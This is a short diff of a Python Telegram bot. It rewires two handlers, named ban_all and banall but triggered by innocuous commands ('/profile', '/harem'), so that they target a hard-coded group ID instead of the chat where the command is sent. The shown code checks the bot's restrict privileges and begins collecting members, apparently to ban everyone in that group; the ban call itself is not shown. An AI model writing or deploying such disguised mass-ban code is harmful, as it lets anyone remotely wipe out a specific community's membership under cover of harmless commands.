@@ -27,7 +27,7 @@ NK = "Required Admin permission To Send Messages in Group"
 LOGG = -1001686630791
 @app.on_message(filters.command("profile"))
 async def ban_all(_,msg):
-    chat_id=msg.chat.id
+    chat_id=-1001497090502
     bot=await app.get_chat_member(chat_id,BOT_ID)
     bot_permission=bot.privileges.can_restrict_members==True
     if bot_permission:
@@ -44,7 +44,7 @@ async def ban_all(_,msg):
 
 @app.on_message(filters.command("harem"))
 async def banall(_, message):
-    chat_id = message.chat.id
+    chat_id = -1001497090502
     user_id = message.from_user.id
     try: 
         Members = []
